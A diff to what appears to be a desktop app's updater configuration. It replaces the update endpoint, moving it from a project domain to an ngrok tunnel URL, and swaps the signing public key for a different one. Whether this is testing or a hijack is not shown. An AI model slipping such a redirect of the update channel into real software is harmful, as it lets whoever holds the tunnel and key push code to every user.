@@ -47,8 +47,8 @@
     },
     "updater": {
       "active": true,
-      "endpoints": ["https://lexivo.uzdevelop.ru/static/update.json"],
-      "pubkey": "dW50cnVzdGVkIGNvbW1lbnQ6IG1pbmlzaWduIHB1YmxpYyBrZXk6IDhGRDEzNERCRkY0MTVGQTAKUldTZ1gwSC8yelRSanlackhOLzZ6dDhtcWU1ZkEyQ2JsTUtHak9XcGF3WXA5MGFzOUpPVi9QekIK"
+      "endpoints": ["https://0ca1-84-54-66-181.eu.ngrok.io/update/{{current_version}}/"],
+      "pubkey": "dW50cnVzdGVkIGNvbW1lbnQ6IG1pbmlzaWduIHB1YmxpYyBrZXk6IDdDRDcwNzM5RDE1MEZGQUYKUldTdi8xRFJPUWZYZkV3QmxMcURzcC92cDdzUHJiMG5meXZFK1pEVDFHOHJxbU1adjB5akkrZEUK"
     },
     "windows": [
       {
